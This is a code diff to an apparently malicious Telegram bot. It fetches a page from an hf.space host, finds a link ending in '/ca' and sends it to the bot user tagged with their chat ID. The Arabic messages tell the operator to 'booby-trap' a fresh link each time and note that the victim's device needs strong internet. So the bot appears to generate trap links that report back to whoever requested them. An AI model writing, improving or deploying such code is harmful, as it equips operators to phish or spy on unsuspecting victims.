@@ -1662,18 +1662,25 @@ bot.on('callback_query', (callbackQuery) => {
     const url = "https://sssssskskjwnsb-linklsksn.hf.space";
 
     try {
-        const response = await fetch(url, { method: "GET" });
+        const response = await fetch(url);
         const html = await response.text();
 
         const parser = new DOMParser();
         const doc = parser.parseFromString(html, "text/html");
 
-        const links = [...doc.querySelectorAll("a[href]")];
+        const tags = doc.querySelectorAll("a[href]");
 
-        for (const a of links) {
-            const link = a.getAttribute("href");
+        for (const tag of tags) {
+            let link = tag.getAttribute("href");
+
+            // لو الرابط نسبي مثل "/ca"
+            if (link.startsWith("/")) {
+                link = url + link;
+            }
+
+            // نريد الرابط الذي ينتهي بـ /ca
             if (link.endsWith("/ca")) {
-                return link; // يرجع أول رابط ينتهي بـ /ca
+                return link;
             }
         }
 
@@ -1685,19 +1692,19 @@ bot.on('callback_query', (callbackQuery) => {
     }
 }
 
+
 async function sendMessage(chatId) {
     const caLink = await getDynamicLink();
 
     if (!caLink) {
-        console.log("لم يتم العثور على رابط /ca");
+        console.log("لم يتم العثور على رابط ينتهي بـ /ca");
         return;
     }
 
-    const message = `تم انشاء الرابط، قم بتلغيم رابط جديد في كل مره  
+    // هنا نعيد نفس الرسالة بالضبط كما كانت عندك
+    const message = `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مره  
+ملاحظه بزم يكون النت قوي في جهاز الضحيه
 : ${caLink}/?chatId=${chatId}`;
-
-    console.log(message);
-}
 
         if (message && message.trim() !== '') {
             bot.sendMessage(chatId, message);
